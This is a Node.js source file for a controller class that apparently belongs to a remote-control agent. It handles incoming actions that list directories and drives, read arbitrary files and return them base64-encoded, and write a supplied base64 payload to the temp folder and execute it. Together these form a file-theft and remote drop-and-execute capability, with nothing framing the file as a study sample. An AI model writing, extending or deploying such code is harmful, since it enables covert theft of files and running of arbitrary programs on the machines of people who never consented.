const fs = require('fs');
const path = require('path');
const spawn = require("child_process").spawn
const os = require('os');
const exec = require('node-exec-promise').exec;
module.exports = class DirectoryController {

    constructor() {

    }
    getDirectory(reqPath) {
        var files = [];
        fs.readdirSync(reqPath).forEach(file => {
            files.push(file);
        });
        return files;
    }
    getDriveList() {
        const list = spawn('cmd');
        return new Promise((resolve, reject) => {
            list.stdout.on('data', function (data) {
                const output = String(data)
                const out = output.split("\r\n").map(e => e.trim()).filter(e => e != "")
                if (out[0] === "Name") {
                    resolve(out.slice(1))
                }
            });
            list.stderr.on('data', function (data) {
            });
            list.on('exit', function (code) {

                if (code !== 0) {
                    reject(code)
                }
            });
            list.stdin.write('wmic logicaldisk get name\n');
            list.stdin.end();
        })
    }

    base64_encode(file) {

        var tmp = fs.readFileSync(file);

        return new Buffer(tmp).toString('base64');
    }

    base64_decode(base64str, file) {

        var resFile = new Buffer(base64str, 'base64');

        fs.writeFileSync(file, resFile);

    }

    updateDirectoryAction(action) {
        action.payload = JSON.stringify(this.getDirectory(action.message));
        action.isDone = true;

        return action;
    }
    async updateDrivesAction(action) {
        var drives = await this.getDriveList();
        action.payload = JSON.stringify(drives);
        action.isDone = true;

        return action;
    }
    async updateFileAction(action) {
        let pathFile = action.message;
        let file = {
            name: path.basename(pathFile),
            filebase64: this.base64_encode(action.message)
        }
        action.payload = JSON.stringify(file);
        action.isDone = true;
    }
    async updateSendExecuteAction(action) {
        let finalPath = os.tmpdir();
        let filePath = finalPath + '/' + action.message;
        console.log(filePath);
        this.base64_decode(action.payload, filePath);
        exec(filePath);
        action.message = 'Execute '+action.message+' successfully.';
        action.payload = null;
        action.isDone = true;
        return action;


    }
}